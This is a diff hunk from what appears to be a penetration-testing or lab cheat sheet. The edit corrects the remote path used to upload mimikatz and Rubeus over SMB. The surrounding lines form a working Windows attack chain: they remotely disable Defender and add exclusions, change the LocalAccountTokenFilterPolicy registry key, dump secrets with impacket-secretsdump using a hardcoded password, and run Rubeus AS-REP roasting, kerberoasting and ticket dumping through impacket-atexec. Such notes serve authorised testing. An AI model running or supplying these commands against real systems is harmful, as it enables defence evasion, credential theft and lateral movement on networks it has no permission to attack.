@@ -1768,8 +1768,8 @@ Invoke-Command -ComputerName SRV01 -ScriptBlock { Add-MpPreference -ExclusionPat
 Invoke-Command -ComputerName SRV01 -ScriptBlock { Set-MpPreference -DisableRealtimeMonitoring $true }
 Invoke-Command -ComputerName SRV01 -ScriptBlock { reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f }
 impacket-secretsdump 'dbf':'123qweasdF!'@$TARGET
-nxc smb $TARGET -u dbf -p '123qweasdF!' --local-auth --put /Upload/windows/mimikatz.exe tasks
-nxc smb $TARGET -u dbf -p '123qweasdF!' --local-auth --put /Upload/windows/Rubeus.exe tasks
+nxc smb $TARGET -u dbf -p '123qweasdF!' --local-auth --put /Upload/windows/mimikatz.exe Windows\\Tasks\\mimikatz.exe
+nxc smb $TARGET -u dbf -p '123qweasdF!' --local-auth --put /Upload/windows/Rubeus.exe Windows\\Tasks\\Rubeus.exe
 impacket-atexec 'dbf':'123qweasdF!'@$TARGET 'C:\Windows\Tasks\Rubeus.exe asreproast'
 impacket-atexec 'dbf':'123qweasdF!'@$TARGET 'C:\Windows\Tasks\Rubeus.exe kerberoast'
 impacket-atexec 'dbf':'123qweasdF!'@$TARGET 'C:\Windows\Tasks\Rubeus.exe dump /nowrap'
